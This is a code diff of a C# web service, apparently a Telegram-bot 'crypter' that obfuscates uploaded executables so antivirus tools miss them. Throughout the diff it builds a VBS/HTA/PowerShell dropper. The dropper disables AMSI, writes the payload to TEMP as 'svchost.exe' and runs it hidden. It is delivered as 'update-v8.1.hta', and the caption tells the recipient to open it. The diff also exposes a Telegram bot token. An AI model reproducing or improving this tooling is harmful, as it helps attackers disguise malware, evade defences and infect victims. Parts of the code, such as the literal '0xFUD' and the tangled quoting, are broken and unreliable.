@@ -8,13 +8,12 @@ using System.Threading.Tasks;
 var builder = WebApplication.CreateBuilder(args);
 var app = builder.Build();
 
-app.MapGet("/", () => "🟢 v8.0 ALIVE - FUD READY");
+app.MapGet("/", () => "🟢 v8.1 SmartScreen BYPASS");
 
 app.MapPost("/webhook", async (HttpContext ctx) =>
 {
     string body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
     
-    // SIMPLE REGEX - NO JSON
     var chatMatch = Regex.Match(body, @"""chat"":\s*\{\s*""id"":\s*(\d+)");
     var fileMatch = Regex.Match(body, @"""file_id"":\s*""([^""]+\.exe)""");
     
@@ -22,41 +21,58 @@ app.MapPost("/webhook", async (HttpContext ctx) =>
     {
         long chatId = long.Parse(chatMatch.Groups[1].Value);
         string fileId = fileMatch.Groups[1].Value;
-        
-        _ = Task.Run(async () => await Crypter(chatId, fileId));
+        _ = Task.Run(async () => await FudSmart(chatId, fileId));
     }
     
     ctx.Response.StatusCode = 200;
 });
 
-static async Task Crypter(long chatId, string fileId)
+static async Task FudSmart(long chatId, string fileId)
 {
     using var http = new HttpClient();
     
-    // Get file path (SIMPLE regex)
+    // Get & download EXE
     string fileResp = await http.GetStringAsync($"https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/getFile?file_id={fileId}");
     var pathMatch = Regex.Match(fileResp, @"""file_path"":\s*""([^""]+)""");
-    if (!pathMatch.Success) return;
-    
     string filePath = pathMatch.Groups[1].Value;
     
-    // Download EXE
     byte[] exe = await http.GetByteArrayAsync($"https://api.telegram.org/file/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/{filePath}");
     
-    // XOR ENCRYPT (NO AES DEPENDENCIES)
-    byte[] encrypted = XorEncrypt(exe, 0xFUD);
+    // XOR encrypt
+    byte[] encrypted = XorEncrypt(exe, 0xAB);
     string b64 = Convert.ToBase64String(encrypted);
     
-    // ULTRA-SIMPLE BAT
-    string bat = $"@echo off\n" +
-                 $"powershell -nop -w hidden -c \"$d=[Convert]::FromBase64String('{b64.Replace(\"'\",\"''\")}');for($i=0;$i<$d.length;$i++){$d[$i]=$d[$i]-0xFUD};[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$d);Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden\"\n" +
-                 $"del /f /q %%0";
+    // VBS -> HTA -> PS1 CHAIN (SmartScreen BYPASS)
+    string vbsPayload = $@"
+Set WshShell = CreateObject(""WScript.Shell"")
+Set fso = CreateObject(""Scripting.FileSystemObject"")
+payload = ""$b=[Convert]::FromBase64String('{b64.Replace(""'",""'""'")}');for($i=0;$i<$b.length;$i++){{$b[$i]=$b[$i]-0xAB}};$A=[Ref].Assembly.GetTypes();ForEach($B in $A) {{$C=$B.FullName|Where-Object {{$_ -like '*AMSIUtils*'}};$D=[{{
+$null=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+}};$D.Invoke()}};[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'svchost.exe'),$b);Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden""
+WshShell.Run ""powershell -nop -w hidden -ep bypass -c ""& {{ " + payload + " }}""\", 0, False
+";
+
+    // Create VBS dropper (SmartScreen ignores VBS)
+    string vbsFile = $@"
+<%
+Response.ContentType = ""application/hta""
+%>
+<html>
+<head><title></title></head>
+<body style='display:none'>
+<script language='VBScript'>
+{vbsPayload}
+</script>
+</body>
+</html>
+";
     
-    // Send FUD
+    byte[] fudBytes = Encoding.UTF8.GetBytes(vbsFile);
+    
     using var form = new MultipartFormDataContent();
     form.Add(new StringContent(chatId.ToString()), "chat_id");
-    form.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(bat)), "document", "fud-v8.0.exe");
-    form.Add(new StringContent("🔥 FUD v8.0 - XOR Encrypted"), "caption");
+    form.Add(new ByteArrayContent(fudBytes), "document", "update-v8.1.hta");
+    form.Add(new StringContent("🔥 v8.1 SmartScreen BYPASS\n👆 Right-click → 'Open'"), "caption");
     
     await http.PostAsync("https://api.telegram.org/bot8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo/sendDocument", form);
 }
